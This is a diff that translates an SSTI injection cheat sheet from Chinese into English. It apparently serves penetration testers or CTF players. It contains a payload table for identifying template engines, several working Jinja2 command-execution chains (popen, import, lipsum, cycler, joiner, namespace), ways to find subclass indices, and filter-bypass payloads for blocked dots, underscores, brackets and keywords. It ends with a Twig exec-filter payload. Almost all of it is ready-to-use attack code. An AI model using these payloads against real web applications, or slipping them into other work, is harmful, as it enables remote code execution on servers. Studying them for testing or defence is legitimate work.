@@ -1,11 +1,11 @@
-# SSTI 注入链速查表
+# SSTI Injection Chain Quick Reference
 
-## 模板引擎识别
+## Template Engine Identification
 
-| 测试 payload | 如果渲染结果为 | 引擎 |
+| Test payload | If the rendered result is | Engine |
 |-------------|--------------|------|
 | `{{7*7}}` | `49` | Jinja2 / Twig / Twig |
-| `{{7*7}}` | `{{7*7}}` | 不是 Jinja2/Twig |
+| `{{7*7}}` | `{{7*7}}` | Not Jinja2/Twig |
 | `${7*7}` | `49` | Freemarker / Velocity / Mako |
 | `#{7*7}` | `49` | Thymeleaf / Ruby ERB |
 | `<%= 7*7 %>` | `49` | ERB (Ruby) |
@@ -13,62 +13,62 @@
 | `#{7*7}` | `#{49}` | Thymeleaf |
 | `{{7*'7'}}` | `7777777` | Jinja2 |
 | `{{7*'7'}}` | `49` | Twig |
-| `{{config}}` | 配置对象 | Jinja2 / Twig |
+| `{{config}}` | Config object | Jinja2 / Twig |
 
-## Jinja2 注入链
+## Jinja2 Injection Chains
 
-### 基础命令执行
+### Basic command execution
 ```python
-# 方法1：os.popen
+# Method 1: os.popen
 {{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}
 
-# 方法2：直接 import
+# Method 2: direct import
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}
 
-# 方法3：lipsum
+# Method 3: lipsum
 {{lipsum.__globals__['os'].popen('id').read()}}
 
-# 方法4：cycler
+# Method 4: cycler
 {{cycler.__init__.__globals__.os.popen('id').read()}}
 
-# 方法5：joiner
+# Method 5: joiner
 {{joiner.__init__.__globals__.os.popen('id').read()}}
 
-# 方法6：namespace
+# Method 6: namespace
 {{namespace.__init__.__globals__.os.popen('id').read()}}
 ```
 
-### 查找子类索引
+### Finding the subclass index
 ```python
-# 列出所有可用子类
+# List all available subclasses
 {{''.__class__.__mro__[1].__subclasses__()}}
 
-# 查找特定类的索引
+# Find the index of a specific class
 {% for i,c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{i}}{% endif %}{% endfor %}
 
-# 常用子类索引
-# catch_warnings: 通常在 132-140 之间
-# Popen: 通常在 200+ 之间
-# _io._IOBase: 通常在 80-100 之间
+# Common subclass indices
+# catch_warnings: usually between 132-140
+# Popen: usually 200+
+# _io._IOBase: usually between 80-100
 ```
 
-### 过滤绕过
+### Filter bypass
 ```python
-# 点号被过滤 → 用 |attr
+# Dot is filtered → use |attr
 {{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}
 
-# 下划线被过滤 → 用 \x5f 或 request
+# Underscore is filtered → use \x5f or request
 {{''|attr('\x5f\x5fclass\x5f\x5f')}}
 {{''|attr(request.args.c)}}&c=__class__
 
-# 方括号被过滤 → 用 |attr + __getitem__
+# Square brackets are filtered → use |attr + __getitem__
 {{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}
 
-# 关键字被过滤 → 拼接
+# Keyword is filtered → concatenate
 {{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['po'+'pen']('id').read()}}
 ```
 
-## Twig 注入链
+## Twig Injection Chains
 
 ```php
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
